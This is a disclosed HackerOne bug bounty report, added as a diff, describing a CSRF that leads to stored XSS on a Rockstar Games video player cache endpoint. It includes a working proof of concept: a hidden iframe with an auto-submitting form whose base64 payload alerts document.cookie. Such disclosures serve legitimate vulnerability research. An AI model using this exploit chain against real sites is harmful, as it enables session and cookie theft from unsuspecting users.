@@ -1,0 +1,24 @@
+ReportLink:https://hackerone.com/reports/152013
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/nahamsec
+ReportedTo:Rockstar Games(rockstargames)
+BountyAmount:750.0
+Severity:medium
+State:Closed
+DateOfDisclosure:10.03.2017 23:15:18
+
+Summary:
+
+Hello,
+
+#Background:
+Sending a POST request to set.php with age='PAYLOAD' will cause a stored XSS on the GET.php file (most likely caused by the cookie, since that's what the `age` is based on). For this vulnerability and in order to demonstrate BOTH CSRF and XSS I have written a simple script (tested on firefox)  that automatically sends the request to set.php and redirects you to the vulnerable file:
+
+#POC:
+
+````
+<iframe style="display:none" name="csrf-frame" id="csrf-frame"></iframe><form method="POST" action="http://www.rockstargames.com/php/videoplayer_cache/set.php" target="csrf-frame" id="csrf-form" encType="application/x-www-form-urlencoded"><input type="text" name="age" value='<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==>CLICK ME</a>' /></form><script>document.getElementById("csrf-form").submit();</script><script>var xssframe = document.getElementById('csrf-frame');xssframe.addEventListener("load", function() { window.location='http://www.rockstargames.com/php/videoplayer_cache/get.php'; }); </script>
+````
+
+Thanks,
+Ben
